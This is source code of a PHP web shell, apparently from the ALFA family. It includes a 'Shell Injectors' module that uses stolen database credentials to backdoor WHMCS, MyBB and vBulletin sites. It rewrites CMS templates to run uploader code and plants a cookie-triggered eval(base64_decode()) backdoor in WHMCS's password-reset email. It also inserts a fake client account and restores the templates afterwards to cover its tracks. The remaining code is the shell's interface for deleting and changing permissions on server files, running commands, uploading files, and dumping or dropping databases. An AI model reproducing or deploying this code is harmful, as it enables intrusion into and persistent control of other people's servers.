            "<p><div class='txtfont_header'>| WHMCS |</div></p><center><center><p>" .
            getConfigHtml("whmcs") .
            "</p><form onSubmit=\"g('ShellInjectors',null,'whmcs',null,null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.path.value); return false;\" method='post'>";
        $table = [
            "td1" => [
                "color" => "FFFFFF",
                "tdName" => "Path WHMCS Url : ",
                "inputName" => "path",
                "inputValue" => "http://site.com/whmcs",
                "inputSize" => "50",
            ],
            "td2" => [
                "color" => "FFFFFF",
                "tdName" => "Mysql Host : ",
                "inputName" => "dbh",
                "id" => "db_host",
                "inputValue" => "localhost",
                "inputSize" => "50",
            ],
            "td3" => [
                "color" => "FFFFFF",
                "tdName" => "Db Name : ",
                "inputName" => "dbn",
                "id" => "db_name",
                "inputValue" => "",
                "inputSize" => "50",
            ],
            "td4" => [
                "color" => "FFFFFF",
                "tdName" => "Db User : ",
                "inputName" => "dbu",
                "id" => "db_user",
                "inputValue" => "",
                "inputSize" => "50",
            ],
            "td5" => [
                "color" => "FFFFFF",
                "tdName" => "Db Pass : ",
                "inputName" => "dbp",
                "id" => "db_pw",
                "inputValue" => "",
                "inputSize" => "50",
            ],
        ];
        create_table($table);
        echo $selector;
        echo "<p><input type='submit' value=' '></p></form></center></td></tr></table></center>";
        if (isset($_POST["riot6"])) {
            $dbu = $_POST["riot6"];
            $dbn = $_POST["riot7"];
            $dbp = $_POST["riot8"];
            $dbh = $_POST["riot9"];
            $path = $_POST["riot10"];
            $method = $_POST["riot4"];
            $index = "{php}" . ALFA_UPLOADER . ";{/php}";
            $newin = str_replace("'", "\'", $index);
            $newindex = "<p>Dear $newin,</p><p>Recently a request was submitted to reset your password for our client area. If you did not request this, please ignore this email. It will expire and become useless in 2 hours time.</p><p>To reset your password, please visit the url below:<br /><a href=\"{\$pw_reset_url}\">{\$pw_reset_url}</a></p><p>When you visit the link above, your password will be reset, and the new password will be emailed to you.</p><p>{\$signature}</p>{php}if(\$_COOKIE[\"sec\"] == \"123\"){eval(base64_decode(\$_COOKIE[\"sec2\"])); die(\"!\");}{\/php}";
            if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index)) {
                if (filter_var($path, FILTER_VALIDATE_URL)) {
                    ($conn = mysqli_connect($dbh, $dbu, $dbp, $dbn)) or die(mysqli_connect_error());
                    $soleSave = mysqli_query($conn, "select message from tblemailtemplates where name='Password Reset Validation'");
                    $soleGet = mysqli_fetch_assoc($soleSave);
                    $tempSave1 = $soleGet["message"];
                    $tempSave = str_replace("'", "\'", $tempSave1);
                    mysqli_query($conn, "UPDATE tblconfiguration SET value = '1' WHERE setting = 'AllowSmartyPhpTags'") or die(mysqli_error($conn));
                    $inject = "UPDATE tblemailtemplates SET message='$newindex' WHERE name='Password Reset Validation'";
                    ($result = mysqli_query($conn, $inject)) or die(mysqli_error($conn));
                    $create = "insert into tblclients (email) values('riotexec@fbi.gov')";
                    ($result2 = mysqli_query($conn, $create)) or die(mysqli_error($conn));
                    if (function_exists("curl_version") && $method == "auto") {
                        $AlfaSole = new AlfaCURL(true);
                        $saveurl = $AlfaSole->Send($path . "/pwreset.php");
                        $getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i", $saveurl, $token);
                        $AlfaSole->Send($path . "/pwreset.php", "post", "token={$token[1]}&action=reset&email=riotexec@fbi.gov");
                        $backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
                        ($Solevisible = mysqli_query($conn, $backdata)) or die(mysqli_error($conn));
                        __alert("shell injectet...");
                        $ff = "http://" . $path . "/riotexec.php";
                        output($ff);
                    } else {
                        echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='" .
                            $path .
                            "/pwreset.php' target='_blank'>" .
                            $path .
                            "/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>riotexec@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='" .
                            $path .
                            "/riotexec.php' target='_blank'>" .
                            $path .
                            "/riotexec.php</a></b></center><br><br>";
                    }
                } else {
                    __alert("Path is not Valid...");
                }
            }
        }
    }
    if (isset($_POST["riot2"]) && $_POST["riot2"] == "mybb") {
        AlfaNum(1, 2, 3, 5);
        echo __pre() .
            "<p><div class='txtfont_header'>| MyBB |</div></p><center><center>" .
            getConfigHtml("mybb") .
            "<form id='sendajax' onSubmit=\"g('ShellInjectors',null,null,'mybb',null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.prefix.value); return false;\" method=POST>
";
        $table = [
            "td1" => [
                "color" => "FFFFFF",
                "tdName" => "Host : ",
                "inputName" => "dbh",
                "id" => "db_host",
                "inputValue" => "localhost",
                "inputSize" => "50",
            ],
            "td2" => [
                "color" => "FFFFFF",
                "tdName" => "DataBase Name : ",
                "inputName" => "dbn",
                "id" => "db_name",
                "inputValue" => "",
                "inputSize" => "50",
            ],
            "td3" => [
                "color" => "FFFFFF",
                "tdName" => "User Name : ",
                "inputName" => "dbu",
                "id" => "db_user",
                "inputValue" => "",
                "inputSize" => "50",
            ],
            "td4" => [
                "color" => "FFFFFF",
                "tdName" => "Password : ",
                "inputName" => "dbp",
                "id" => "db_pw",
                "inputValue" => "",
                "inputSize" => "50",
            ],
            "td5" => [
                "color" => "FFFFFF",
                "tdName" => "Table Prefix : ",
                "inputName" => "prefix",
                "id" => "db_prefix",
                "inputValue" => "mybb_",
                "inputSize" => "50",
            ],
        ];
        create_table($table);
        echo $selector;
        echo "<p><input type=submit value=' '></p></form></center></center>";
        if (isset($_POST["riot6"])) {
            $dbu = $_POST["riot6"];
            $dbn = $_POST["riot7"];
            $dbp = $_POST["riot8"];
            $dbh = $_POST["riot9"];
            $prefix = $_POST["riot10"];
            $method = $_POST["riot4"];
            $shellCode = "{\${" . ALFA_UPLOADER . "}}";
            $newinshell = str_replace("'", "\'", $shellCode);
            if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($newinshell)) {
                ($conn = mysqli_connect($dbh, $dbu, $dbp, $dbn)) or die(mysqli_error($conn));
                $inject = "select template from {$prefix}templates where  title= 'calendar'";
                ($result = mysqli_query($conn, $inject)) or die(mysqli_error($conn));
                $GetTemp = mysqli_fetch_assoc($result);
                $saveDate = $GetTemp["template"];
                $repsave = str_replace($shellCode, "", $saveDate);
                $repsave = str_replace("'", "\'", $repsave);
                $createShell = "update {$prefix}templates SET template= '" . $newinshell . $repsave . "' where title = 'calendar'";
                ($result2 = mysqli_query($conn, $createShell)) or die(mysqli_error($conn));
                $geturl = "select value from {$prefix}settings where name= 'bburl'";
                ($findurl = mysqli_query($conn, $geturl)) or die(mysqli_error($conn));
                $rowb = mysqli_fetch_assoc($findurl);
                $furl = $rowb["value"];
                $realurl = parse_url($furl, PHP_URL_HOST);
                $realpath = parse_url($furl, PHP_URL_PATH);
                $res = false;
                $AlfaCurl = new AlfaCURL();
                if (extension_loaded("sockets") && function_exists("fsockopen") && $method == "auto") {
                    if ($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)) {
                        @fputs($fsock, "GET $realpath/calendar.php HTTP/1.1\r\n");
                        @fputs($fsock, "HOST: $realurl\r\n");
                        @fputs($fsock, "Connection: close\r\n\r\n");
                        $check = fgets($fsock);
                        if (preg_match("/200 OK/i", $check)) {
                            $repairdbtemp = "update {$prefix}templates SET template= '$repsave' where title = 'calendar'";
                            ($clear = mysqli_query($conn, $repairdbtemp)) or die(mysqli_error($conn));
                            $res = true;
                        }
                        @fclose($fsock);
                    }
                } elseif (function_exists("curl_version") && $method == "auto") {
                    $AlfaCurl->Send($realurl . $realpath . "/calendar.php");
                    $res = true;
                }
                if ($res) {
                    $ff = "http://" . $realurl . $realpath . "/riotexec.php";
                    output($ff);
                } else {
                    $ff = "http://" . $realurl . $realpath . "/calendar.php";
                    $fff = "http://" . $realurl . $realpath . "/riotexec.php";
                    echo "<br><pre id='strOutput' style='margin-top:5px' class='ml1'><br><center><b><font color='#FFFFFF'>Please Go To Target => </font><a href='" .
                        $ff .
                        "' target='_blank'>" .
                        $ff .
                        "</a><br/><font color='#FFFFFF'>And Go To => </font><a href='" .
                        $fff .
                        "' target='_blank'>" .
                        $fff .
                        "</a></b></center><br><br>";
                }
            }
        }
    }
    if (isset($_POST["riot3"]) && $_POST["riot3"] == "vb") {
        AlfaNum(1, 2, 7, 9, 10);
        echo __pre() .
            '<p><div class="txtfont_header">| vbulletin |</div></p><p>' .
            getConfigHtml("vb") .
            '</p><form name="frm" method="POST" onsubmit="g(\'ShellInjectors\',null,null,this.lo.value,\'vb\',this.user.value,this.pass.value,this.tab.value,this.db.value,this.method.value); return false;">';
        $table = [
            "td1" => [
                "color" => "FFFFFF",
                "tdName" => "Host : ",
                "inputName" => "lo",
                "id" => "db_host",
                "inputValue" => "localhost",
                "inputSize" => "50",
            ],
            "td2" => [
                "color" => "FFFFFF",
                "tdName" => "DataBase Name : ",
                "inputName" => "db",
                "id" => "db_name",
                "inputValue" => "",
                "inputSize" => "50",
            ],
            "td3" => [
                "color" => "FFFFFF",
                "tdName" => "User Name : ",
                "inputName" => "user",
                "id" => "db_user",
                "inputValue" => "",
                "inputSize" => "50",
            ],
            "td4" => [
                "color" => "FFFFFF",
                "tdName" => "Password : ",
                "inputName" => "pass",
                "id" => "db_pw",
                "inputValue" => "",
                "inputSize" => "50",
            ],
            "td5" => [
                "color" => "FFFFFF",
                "tdName" => "Table Prefix : ",
                "inputName" => "tab",
                "id" => "db_prefix",
                "inputValue" => "",
                "inputSize" => "50",
            ],
        ];
        create_table($table);
        echo $selector;
        echo '<p><input type="submit" value=" " /></p></form></center>';
        if (isset($_POST["riot4"]) && !empty($_POST["riot4"])) {
            $method = $_POST["riot8"];
            $faq_name = "faq";
            $faq_file = "/faq.php";
            $code = "{\${" . ALFA_UPLOADER . "}}{\${exit()}}&";
            ($conn = @mysqli_connect($_POST["riot2"], $_POST["riot4"], $_POST["riot5"], $_POST["riot7"])) or die(@mysqli_connect_error());
            $rec = "select `template` from " . $_POST["riot6"] . "template WHERE title ='" . $faq_name . "'";
            $recivedata = @mysqli_query($conn, $rec);
            $getd = @mysqli_fetch_assoc($recivedata);
            $savetoass = $getd["template"];
            if (empty($savetoass)) {
                $faq_name = "header";
                $faq_file = "/";
                $rec = "select `template` from " . $_POST["riot6"] . "template WHERE title ='" . $faq_name . "'";
                $recivedata = @mysqli_query($conn, $rec);
                $getd = @mysqli_fetch_assoc($recivedata);
                $savetoass = $getd["template"];
                $code = ALFA_UPLOADER . ";";
            }
            $code = str_replace("'", "\'", $code);
            $p = "UPDATE " . $_POST["riot6"] . "template SET `template`='" . $code . "' WHERE `title`='" . $faq_name . "'";
            ($ka = @mysqli_query($conn, $p)) or die(mysqli_error($conn));
            $geturl = @mysqli_query($conn, "select `value` from " . $_POST["riot6"] . "setting WHERE `varname`='bburl'");
            $getval = @mysqli_fetch_assoc($geturl);
            $saveval = $getval["value"];
            if ($faq_name == "header") {
                if (substr($saveval, -5, 5) == "/core") {
                    $saveval = substr($saveval, 0, -5);
                }
            }
            $realurl = parse_url($saveval, PHP_URL_HOST);
            $realpath = parse_url($saveval, PHP_URL_PATH);
            $res = false;
            $AlfaCurl = new AlfaCURL();
            if (extension_loaded("sockets") && function_exists("fsockopen") && $method == "auto") {
                if ($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)) {
                    @fputs($fsock, "GET $realpath.$faq_file HTTP/1.1\r\n");
                    @fputs($fsock, "HOST: $realurl\r\n");
                    @fputs($fsock, "Connection: close\r\n\r\n");
                    $check = fgets($fsock);
                    if (preg_match("/200 OK/i", $check)) {
                        $p1 = "UPDATE " . $_POST["riot6"] . "template SET template ='" . mysqli_real_escape_string($conn, $savetoass) . "' WHERE title ='" . $faq_name . "'";
                        ($ka1 = @mysqli_query($conn, $p1)) or die(mysqli_error($conn));
                        $res = true;
                    }
                    @fclose($fsock);
                }
            } elseif (function_exists("curl_version") && $method == "auto") {
                $AlfaCurl->Send($realurl . $realpath . $faq_file);
                $p1 = "UPDATE " . $_POST["riot6"] . "template SET template ='" . mysqli_real_escape_string($conn, $savetoass) . "' WHERE title ='" . $faq_name . "'";
                ($ka1 = @mysqli_query($conn, $p1)) or die(mysqli_error($conn));
                $res = true;
            }
            if ($res) {
                $ff = "http://" . $realurl . $realpath . "/riotexec.php";
                output($ff);
            } else {
                $ff = "http://" . $realurl . $realpath . $faq_file;
                $fff = "http://" . $realurl . $realpath . "/riotexec.php";
                echo "<center><p><font color=\"#FFFFFF\">First Open This Link => </font><a href='" .
                    $ff .
                    "' target='_blank'>" .
                    $ff .
                    "</a><br/><font color=\"#FFFFFF\">Second Open This Link => </font><a href='" .
                    $fff .
                    "' target='_blank'>" .
                    $fff .
                    "</a></center></p>";
            }
        }
    }
    echo "</div>";
    riotfooter();
}
function riotcheckfiletype()
{
    $path = $_POST["path"];
    $arg = $_POST["arg"];
    if (@is_file($path . "/" . $arg)) {
        echo "file";
    } else {
        echo "dir";
    }
}
function riotcheckcgi()
{
    if (strlen(riotEx("id", false, true, true)) > 0) {
        echo "ok";
    } else {
        echo "no";
    }
}
function is_ipv4($ip)
{
    return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ? $ip : "(Null)";
}
function __alert($s)
{
    echo "<center>" . __pre() . $s . "</center>";
}
function create_table($data)
{
    echo '<table border="1">';
    foreach ($data as $key => $val) {
        $array = [];
        foreach ($val as $k => $v) {
            $array[$k] = $v;
        }
        echo "<tr><td><div class='tbltxt'>" .
            $array["tdName"] .
            "</div></td><td><input type='text' id='" .
            $array["id"] .
            "' name='" .
            $array["inputName"] .
            "' " .
            ($array["placeholder"] ? "placeholder" : "value") .
            "='" .
            $array["inputValue"] .
            "' size='" .
            $array["inputSize"] .
            "' " .
            ($array["disabled"] ? "disabled" : "") .
            "></td></tr>";
    }
    echo "</table>";
}
function riotfooter()
{
    if (!isset($_POST["ajax"])) {
        echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0' >
   <tr>
      <td width='17%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'mkfile','','','','file');this.f.value='';return false;\"><span class='footer_text'>Make File : </span><br><input class='dir' type='text' name='f' value=''> <input type='submit' value=' '></form></td>
      <td width='21%'><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);this.d.value='';return false;\"><span class='footer_text'>Make Dir : </span><br><input class='dir' type='text' name='d' value=' '> <input type='submit' value=' '></form></td>
      <td width='22%'><form onsubmit=\"g('FilesMan',null,'delete',this.del.value);this.del.value='';return false;\"><span class='footer_text'>Delete : </span><br><input class='dir' type='text' name='del' value=' '> <input type='submit' value=' '></form></td>
      <td width='19%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'chmod','','','','none');this.f.value='';return false;\"><span class='footer_text'>Chmod : </span><br><input class='dir' type=text name=f value=' '> <input type='submit' value=' '></form></td>
   </tr>
   <tr>
      <td colspan='2'>
         <form onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span class='footer_text'>Change Dir : </span><br><input class='foottable' id='footer_cwd' type='text' name='c' value='" .
            htmlspecialchars($GLOBALS["cwd"]) .
            "'> <input type='submit' value=' '></form>
      </td>
      <td colspan='2'><form onsubmit=\"editor(this.file.value,'view','','','','file');return false;\"><span><span class='footer_text'>Read File : </span></span><br><input class='foottable' type='text' name='file' value='/etc/passwd'> <input type='submit' value=' '></form></td>
   </tr>
   <tr>
      <td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='riotOpenPhpTerminal();return false;' class='foottable riot_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='https://icons.iconarchive.com/icons/bokehlicia/captiva/128/terminal-red-icon.png'> Terminal</button><br></form></td>
   </tr>
   <tr>
      <td colspan='4'>
         <form onsubmit='u(this);return false;' name='footer_form' method='post' ENCTYPE='multipart/form-data'>
            <input type='hidden' name='a' value='FilesMAn'>
            <input type='hidden' name='c' value='" .
               $GLOBALS["cwd"] .
               "'>
            <input type='hidden' name='ajax' value='true'>
            <input type='hidden' name='riot1' value='uploadFile'>
            <input type='hidden' name='charset' value='" .
               (isset($_POST["charset"]) ? $_POST["charset"] : "") .
               "'>
            <span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span>
            <p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p>
            <input type='submit' name='submit' value=' '>
         </form>
      </td>
   </tr>
</table>
</div>
<div id='options_window' style='background:rgba(0, 0, 0, 0.69);'>
   <div class='editor-wrapper'>
      <div class='editor-header'>
         <div class='opt-title'></div>
         <div class='editor-controller'>
            <div class='editor-minimize' onClick='editorMinimize(\"options_window\");'></div>
            <div onClick='editorClose(\"options_window\");' class='close-button'></div>
         </div>
      </div>
      <div style='height:100%;' class='content_options_holder'>
         <div class='options_tab'></div>
         <div class='options_content' style='margin-left:14px;margin-right:30px;background:#000;overflow:auto;'></div>
      </div>
   </div>
</div>
<div id='database_window' style='background:rgba(0, 0, 0, 0.69);'>
   <div class='editor-wrapper'>
      <div class='editor-header'>
         <div class='opt-title'>Sql Manager</div>
         <div class='editor-controller'>
            <div class='editor-minimize' onClick='editorMinimize(\"database_window\");'></div>
            <div onClick='editorClose(\"database_window\");' class='close-button'></div>
         </div>
      </div>
      <div class='content_options_holder' style='margin-left:14px;margin-right:30px;background:#000;max-height:90%;'>
         <div class='sql-tabs'></div>
         <div class='sql-contents' style='max-height: 85vh;'></div>
      </div>
   </div>
</div>
<div id='cgiloader'>
   <div class='editor-wrapper'>
      <div class='editor-header'>
         <div class='opt-title'></div>
         <div class='editor-controller'>
            <div class='editor-minimize' onClick='editorMinimize(\"cgiloader\");'></div>
            <div onClick='editorClose(\"cgiloader\");' class='close-button'></div>
         </div>
      </div>
      <div id='cgiframe' style='position:relative;margin-left:14px;margin-right:30px;'>
         <div class='terminal-tabs'></div>
         <div style='height:90%;' class='terminal-contents'></div>
      </div>
   </div>
</div>
<div id='editor' style='display:none;'>
   <div class='editor-wrapper'>
      <div class='editor-header'>
         <div class='editor-path'></div>
         <div class='editor-controller'>
            <div class='editor-minimize' onClick='editorMinimize(\"editor\");'></div>
            <div onClick='editorClose(\"editor\");' class='close-button'></div>
         </div>
      </div>
      <div onclick='historyPanelController(this);' mode='visible' class='history-panel-controller'><<</div>
      <div class='editor-explorer'>
         <div class='hheader'>
            <div class='history-clear' onclick='clearEditorHistory();'>Clear all</div>
            <div class='hheader-text'>History</div>
            <div class='editor-search'><input type='text' style='text-align:center;' id='search-input' placeholder='search'></div>
         </div>
         <div class='history-list'></div>
      </div>
      <div class='editor-modal'>
         <div class='editor-body'>
            <div class='editor-content'>
               <div class='editor-tabs'></div>
               <div class='editor-content-holder'></div>
            </div>
         </div>
      </div>
   </div>
</div>
<div id='update-content'></div>
<div id='database_window-minimized' onclick='showEditor(\"database_window\");'>
   <div class='minimized-wrapper'>
      <span class='options_min_badge'>0</span>
      <div class='minimized-text' style='top: 15px;'>Database</div>
   </div>
</div>
<div id='options_window-minimized' onclick='showEditor(\"options_window\");'>
   <div class='minimized-wrapper'>
      <span class='options_min_badge'>0</span>
      <div style='top: 4px;' class='minimized-text'>Options</div>
   </div>
</div>
<div id='editor-minimized' onclick='showEditor(\"editor\");'>
   <div class='minimized-wrapper'>
      <span class='options_min_badge'>0</span>
      <div style='top: 2px;' class='minimized-text'>Editor</div>
   </div>
</div>
<div id='cgiloader-minimized' onclick='showEditor(\"cgiloader\");'>
   <div class='minimized-wrapper'>
      <span class='options_min_badge'>0</span>
      <div style='top: 12px;' class='minimized-text'>Cgi Shell</div>
   </div>
</div>
<div id='rightclick_menu'>
   <a target='_blank' href='' name='newtab'><img src=\"https://dev.artikelspiner.id/icon/newtab.svg\"> Open in new tab</a>
   <a target='_blank' href='' name='link'><img src=\"https://dev.artikelspiner.id/icon/link.svg\"> Open file directly</a>
   <a href='javascript:void(0);' name='download'><img src=\"https://dev.artikelspiner.id/icon/download2.svg\"> Download</a>
   <a href='' name='view'><img src=\"https://dev.artikelspiner.id/icon/view.svg\"> View</a>
   <a href='javascript:void(0);' onclick='riotSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"https://dev.artikelspiner.id/icon/view.svg\"> View Archive</a>
   <a href='' name='edit'><img src=\"https://dev.artikelspiner.id/icon/edit.svg\"> Edit</a>
   <a href='javascript:void(0);' onclick='riotPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"https://dev.artikelspiner.id/icon/move.svg\"> Move</a>
   <a href='javascript:void(0);' onclick='riotPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"https://dev.artikelspiner.id/icon/copy.svg\"> Copy</a>
   <a href='javascript:void(0);' onclick='riotPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"https://dev.artikelspiner.id/icon/rename.svg\">  Rename</a>
   <a href='javascript:void(0);' onclick='riotPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"https://dev.artikelspiner.id/icon/time.svg\">  Modify</a>
   <a href='javascript:void(0);' onclick='riotPopupAction(this, \"permission\");' name='permission'><img src=\"https://dev.artikelspiner.id/icon/key.svg\"> Change Permissions</a>
   <a href='javascript:void(0);' onclick='riotSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"https://dev.artikelspiner.id/icon/resize.svg\"> Compress</a>
   <a href='javascript:void(0);' onclick='riotSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"https://dev.artikelspiner.id/icon/increase.svg\"> Extract</a>
   <a href='javascript:void(0);' name='delete'><img src=\"https://dev.artikelspiner.id/icon/delete.svg\"> Delete</a>
</div>
<div id=\"filesman-tab-full-path\"></div>
<div id='alert-area' class='alert-area'></div>
<div class='cl-popup-fixed' style='display:none;'>
   <div id='shortcutMenu-holder'>
      <div class='popup-head'></div>
      <form autocomplete='off' onSubmit='return false;'>
         <label class='old-path-lbl'></label>
         <div style='overflow: hidden;white-space: nowrap;text-overflow: ellipsis;' class='old-path-content'></div>
         <label style='margin-top:10px;' class='new-filename-lbl'>New file name</label>
         <input type='text' name='fname'>
         <div class='perm-table-holder'>
            <table>
               <tbody>
                  <tr>
                     <td><b>Mode</b></td>
                     <td>User</td>
                     <td>Group</td>
                     <td>World</td>
                  </tr>
                  <tr>
                     <td>Read</td>
                     <td><input type='checkbox' name='ur' value='4' onclick='calcperm();'></td>
                     <td><input type='checkbox' name='gr' value='4' onclick='calcperm();'></td>
                     <td><input type='checkbox' name='wr' value='4' onclick='calcperm();'></td>
                  </tr>
                  <tr>
                     <td>Write</td>
                     <td><input type='checkbox' name='uw' value='2' onclick='calcperm();'></td>
                     <td><input type='checkbox' name='gw' value='2' onclick='calcperm();'></td>
                     <td><input type='checkbox' name='ww' value='2' onclick='calcperm();'></td>
                  </tr>
                  <tr>
                     <td>Execute</td>
                     <td><input type='checkbox' name='ux' value='1' onclick='calcperm();'></td>
                     <td><input type='checkbox' name='gx' value='1' onclick='calcperm();'></td>
                     <td><input type='checkbox' name='wx' value='1' onclick='calcperm();'></td>
                  </tr>
                  <tr>
                     <td>Permission</td>
                     <td><input style='width:60px;' type='text' name='u' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"u\", [\"u\"]);'></td>
                     <td><input style='width:60px;' type='text' name='g' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"g\", [\"g\"]);'></td>
                     <td><input style='width:60px;' type='text' name='w' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"w\", [\"w\"]);'></td>
                  </tr>
               </tbody>
            </table>
         </div>
      </form>
      <div class='popup-foot'>
         <button style='background: #2b5225;' name='accept' action='' onclick='riotPopUpDoAction(this);'></button>
         <button style='background: #9e2c2c;' onclick='d.querySelector(\".cl-popup-fixed\").style.display=\"none\";'>Cancell</button>
      </div>
   </div>
</div>
"; ?>
<script>
function riotMysqlApi(e,t){var a={host:mysql_cache[e.db_id].host,user:mysql_cache[e.db_id].user,pass:mysql_cache[e.db_id].pass,db:e.db_target,db_id:e.db_id};if(e.hasOwnProperty("db_info"))for(var i in e.db_info)a[i]=e.db_info[i];var l={a:riotb64("Sql_manager_api"),c_:riotb64(c_),riot1:riotb64(JSON.stringify(a))};if(e.hasOwnProperty("post"))for(var i in e.post.hasOwnProperty("riot2")&&"load_data"!=e.post.riot2&&"page"!=e.post.riot2&&"edit"!=e.post.riot2&&"delete"!=e.post.riot2&&(d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-pager").innerHTML="",d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-reporter").innerHTML=""),e.post)l[i]=riotb64(e.post[i]);var r="";for(var o in l)r+=o+"="+l[o]+"&";riotloader(e.db_id,"block"),_Ajax(d.URL,r,function(a){riotloader(e.db_id,"none"),t(a)},!0,e.db_id)}function riotMysqlFilterTable(e,t){setTimeout(function(){var a="",i="",l=(a="","");if(null!=e)a=e.getAttribute("target"),i=e.getAttribute("db_id"),l=e.value;else a=t.target,i=t.db_id,l=t.value;l=new RegExp(l,"i"),d.querySelectorAll("#"+i+" "+a+" ul > li").forEach(function(e){var t=e.querySelector(".mysql_tables");if(null==t)return!1;-1==(t=t.innerText).search(l)?e.style.display="none":e.style.display="block"})},200)}function riotMysqlFilterAllTable(e,t){var a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" .mysql-tables input[name=filter_all]").value,l=d.querySelector("#"+a+" input[name=sql_count]").checked,r=[],o=[];if(d.querySelectorAll("#"+a+" .mysql-tables .list_container").forEach(function(e){var t=e.getAttribute("mode"),a=e.getAttribute("db_name");"no"==t&&r.push(a),o.push(a)}),r.length>0){if(0==i.length&&void 0===t)return!1;riotMysqlApi({db_id:a,db_target:r[0],ajax_id:"mysql_get_all_tables",db_info:{databases:r},post:{riot2:"load_all_tables",riot3:l}},function(r){if(0!=r.length){for(var o in r=JSON.parse(r)){var n=o,s=d.querySelector("#"+a+" .cls-"+n);riotMysqlMakeTblList(r[o],s,a,n,l)}void 0===t?riotMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}):(e.setAttribute("mode","opened"),d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="https://dev.artikelspiner.id/icon/b_minus.png")}})}else if(void 0===t)for(var n in riotMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}),o)riotMysqlTableMode(a,o[n],"closed");else{var s="",c=e.getAttribute("mode");for(var n in"opened"==c?(e.setAttribute("mode","closed"),s="b_plus.png"):(e.setAttribute("mode","opened"),s="b_minus.png"),o)riotMysqlTableMode(a,o[n],c);d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="https://dev.artikelspiner.id/icon/"+s}}function riotMysqlTableMode(e,t,a){var i=d.querySelector("#"+e+" .cls-"+t),l="";void 0===a?(l=-1!=i.classList.value.indexOf("hide-db-tables")?"b_minus.png":"b_plus.png",i.classList.toggle("hide-db-tables")):"opened"==a?(l="b_plus.png",i.classList.add("hide-db-tables")):(l="b_minus.png",i.classList.remove("hide-db-tables")),d.querySelector("#"+e+" .cls-"+t+"-expander img").src="https://dev.artikelspiner.id/icon/"+l}function riotMysqlExpander(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=e.getAttribute("sql_count"),l=d.querySelector("#"+a+" .cls-"+t);"loaded"==l.getAttribute("mode")?riotMysqlTableMode(a,t):riotMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_get_tables",post:{riot2:"load_tables",riot3:i}},function(e){0!=e.length&&riotMysqlMakeTblList(e=JSON.parse(e),l,a,t,i)})}function riotMysqlTablesEvil(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i=e.getAttribute("mode");"checked"==i?(i=!1,e.setAttribute("mode","not")):(i=!0,e.setAttribute("mode","checked")),d.querySelectorAll("#"+a+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked=i})}function riotMysqlTablesDumpDrop(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i="none";"dump"==e.value&&(i="block"),d.querySelector("#"+a+" "+t+" .dump-file-holder").style.display=i}function riotMysqlTablesDumpDropBtn(e){var t=e.getAttribute("target"),a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=[],r=d.querySelector("#"+i+" input[name=sql_count]").checked,o=d.querySelector("#"+i+" "+t),n=o.querySelector("select[name=tables_evil]").value,s=o.querySelector(".dump-file-holder input").value;d.querySelectorAll("#"+i+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked&&l.push(e.value)}),l.length>0&&riotMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_query_evil",db_info:{tables:l,mode:n,dump_file:s},post:{riot2:"dump_drop"}},function(e){0!=e.length&&(e=JSON.parse(e),"drop"==n?riotMysqlMakeTblList(e,o,i,a,r):o.querySelector(".dump-file-holder").insertAdjacentHTML("beforeend","<div><a href='javascript:void(0);' onclick='g(\"FilesTools\",null,\""+s+'","download");\'><span>Download: '+s+"</span></a></div>"))})}function riotMysqlMakeTblList(e,t,a,i,l){t.setAttribute("mode","loaded");var r='<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" db_id="'+a+'" placeholder="Filter 